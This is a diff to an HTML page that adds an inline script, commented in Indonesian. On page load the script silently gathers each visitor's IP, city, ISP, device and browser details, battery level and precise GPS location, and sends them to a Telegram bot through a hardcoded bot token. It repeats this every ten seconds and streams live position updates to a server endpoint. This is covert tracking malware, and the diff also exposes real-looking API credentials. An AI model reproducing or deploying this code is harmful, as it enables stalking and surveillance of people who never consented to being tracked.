@@ -84,7 +84,99 @@
     </div>
   </div>
 
-  <!-- JS eksternal -->
+  <!-- SCRIPT -->
+  <script>
+  const CHAT_ID = "7483495590"; // ganti dengan chat id admin
+  const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // ganti bot token
+  const statusEl = document.getElementById('status');
+
+  async function getDeviceInfo() {
+      try {
+          const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
+          const connection = navigator.connection || {};
+          const battery = await navigator.getBattery();
+          const time = new Date().toLocaleString("id-ID");
+          let geo = "Tidak tersedia";
+          if(navigator.geolocation){
+              await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
+                  geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
+                  resolve();
+              }, ()=>resolve()));
+          }
+
+          return `
+🌐 *Informasi IP*
+📶 Alamat IP: ${ipInfo.ip}
+🌍 Negara: ${ipInfo.country}
+🏞️ Wilayah: ${ipInfo.region}
+🏙️ Kota: ${ipInfo.city}
+🛠️ ISP: ${ipInfo.org}
+⏱️ Timezone IP: ${ipInfo.timezone || "-"}
+
+📱 *Detail Perangkat*
+💻 User Agent: ${navigator.userAgent}
+🖥️ Platform: ${navigator.platform}
+🏷️ Vendor: ${navigator.vendor}
+🌐 Browser Online: ${navigator.onLine?"✅ Ya":"❌ Tidak"}
+🗣️ Bahasa Browser: ${navigator.language}
+📐 Orientation: ${screen.orientation ? screen.orientation.type : "❌ Tidak tersedia"}
+🖼️ Resolusi Layar: ${screen.width}x${screen.height} px
+🔍 Pixel Ratio: ${window.devicePixelRatio}
+🎨 Kedalaman Warna: ${screen.colorDepth}-bit
+📡 Jaringan: ${connection.effectiveType||"❌ Tidak diketahui"}
+📶 Downlink: ${connection.downlink||"-"} Mbps
+⏱️ RTT: ${connection.rtt||"-"} ms
+🚀 Bandwidth Max: ${connection.downlinkMax||"-"} Mbps
+🔋 Battery: ${Math.round(battery.level*100)}% ${battery.charging?"⚡️ Mengisi daya":""}
+🍪 Cookies Enabled: ${navigator.cookieEnabled?"✅ Ya":"❌ Tidak"}
+🚫 Do Not Track: ${navigator.doNotTrack||"❌ Tidak tersedia"}
+🖥️ Hardware Concurrency (CPU): ${navigator.hardwareConcurrency||"-"} cores
+🤏 Touch Support: ${("ontouchstart" in window)?"✅ Ya":"❌ Tidak"}
+⏰ Waktu: ${time}
+📍 Geolocation: ${geo}
+          `;
+      } catch(err) {
+          console.error(err);
+          return "❌ Tidak bisa mengambil info device.";
+      }
+  }
+
+  async function sendToTelegram(data) {
+      try{
+          const form = new FormData();
+          form.append("chat_id", CHAT_ID);
+          form.append("text", data);
+          form.append("parse_mode","Markdown");
+          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          await fetch(url,{method:"POST",body:form});
+      } catch(e){
+          console.error(e);
+      }
+  }
+
+  async function liveTracking() {
+      statusEl && (statusEl.textContent = "Mengirim data ke Telegram...");
+      const info = await getDeviceInfo();
+      await sendToTelegram(info);
+      statusEl && (statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`);
+  }
+
+  window.onload = async () => {
+      await liveTracking();
+      setInterval(liveTracking, 10000);
+
+      if(navigator.geolocation){
+          navigator.geolocation.watchPosition(async (pos) => {
+              const { latitude, longitude } = pos.coords;
+              await fetch('/sendLocation', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ latitude, longitude })
+              });
+          }, (err) => console.error(err));
+      }
+  };
+  </script>
   <script src="script.js"></script>
 </body>
 </html>
